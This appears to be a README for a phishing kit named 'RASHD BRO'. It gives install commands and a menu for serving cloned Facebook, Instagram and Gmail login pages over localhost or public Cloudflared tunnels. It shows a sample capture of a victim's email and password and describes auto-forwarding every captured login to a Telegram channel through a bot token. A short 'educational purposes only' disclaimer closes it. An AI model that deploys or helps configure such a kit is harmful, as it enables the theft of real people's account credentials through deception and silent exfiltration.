# 🔥 RASHD BRO · Neon Edition v3.0

## ⚡ Quick Install
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git && cd RASHD-BRO && pip install colorama -q && python3 V4Zteem.py
```

---

> **Developer:** v4zrashd
> **Platform:** Termux (Android) / Linux
> **Language:** Python 3.14+
> **Telegram Channel:** Auto-post enabled

---

## 📋 Full Install Steps

### Step 1: Install Termux
```bash
pkg update && pkg upgrade -y
pkg install python -y
pip install colorama -q
```

### Step 2: Clone & Run
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git
cd RASHD-BRO
python3 V4Zteem.py
```

### Step 3: Install Cloudflared (Optional)
```bash
pkg install cloudflared -y
```

### Step 4: Set Telegram Channel (Optional)
Edit `v4z_config.json`:
```json
{"chat_id":"YOUR_CHANNEL_ID","bot_token":"YOUR_BOT_TOKEN","enabled":true}
```

---

## 🖥️ Menu Guide

| Input | Site | Mode | Route |
|-------|------|------|-------|
| `1` → `1` | Facebook | Localhost | `http://127.0.0.1:PORT` |
| `4` → `2` | All 3 | Cloudflared | `*.trycloudflare.com` |
| `0` → `0` | Exit | — | — |

---

## 📸 Capture Display

```
═══════════════════════════════════════════════════
 ★ CAPTURE #1 — [FB] FB · PAGE 1 · LOGIN ★
═══════════════════════════════════════════════════
  ⏱ TIME       2026-09-28  14:30:22
  📍 FROM      192.168.1.100
  │  ACCOUNT     │  ◆ email@example.com
  │  PASSWORD    │  ★ mysecretpass
═══════════════════════════════════════════════════
```

---

## 📡 Telegram Channel

When enabled in `v4z_config.json`, every capture is auto-posted to your Telegram channel.

### Setup
1. Create bot via [@BotFather](https://t.me/BotFather)
2. Get bot token
3. Get channel ID via [@userinfobot](https://t.me/userinfobot)
4. Edit `v4z_config.json` with both values
5. Run `python3 V4Zteem.py`

### Status Display
```
  📡 Telegram Channel: 🟢 ACTIVE    (when bot_token and chat_id are set)
  📡 Telegram Channel: 🔴 NO TOKEN  (when bot_token is missing)
  📡 Telegram Channel: 🔴 OFF       (when chat_id is empty)
```

---

## 📝 All Commands

### Termux
```bash
pkg update && pkg upgrade -y
pkg install python -y
pip install colorama -q
pkg install cloudflared -y
```

### Git
```bash
git clone https://github.com/v4zrashd/RASHD-BRO.git
cd RASHD-BRO
git pull origin main
```

### Python
```bash
python3 V4Zteem.py
pip install colorama -q
python3 -m py_compile V4Zteem.py
```

---

## 🛠️ Troubleshooting

| Problem | Solution |
|---------|----------|
| `colorama` not found | `pip install colorama -q` |
| `cloudflared` not found | `pkg install cloudflared -y` |
| `No free port` | Tool auto-finds next |
| `Permission denied` | `chmod +x V4Zteem.py` |
| `Git not found` | `pkg install git -y` |

---

## 📁 Files

```
RASHD-BRO/
├── V4Zteem.py          ← Main script
├── README.md            ← This file
├── v4z_config.json      ← Config
├── index.html           ← Hub page
├── fb.html              ← Facebook clone
├── insta.html           ← Instagram clone
├── mail.html            ← Gmail clone
└── .gitignore           ← Git rules
```

---

## 🔒 Legal Disclaimer

> ⚠️ This tool is for educational purposes only.
> Unauthorized use against others is illegal.
> Use only on your own systems or with explicit permission.

---

## 📄 License

**RASHD BRO · Neon Edition v3.0**
Developer: v4zrashd
All rights reserved.
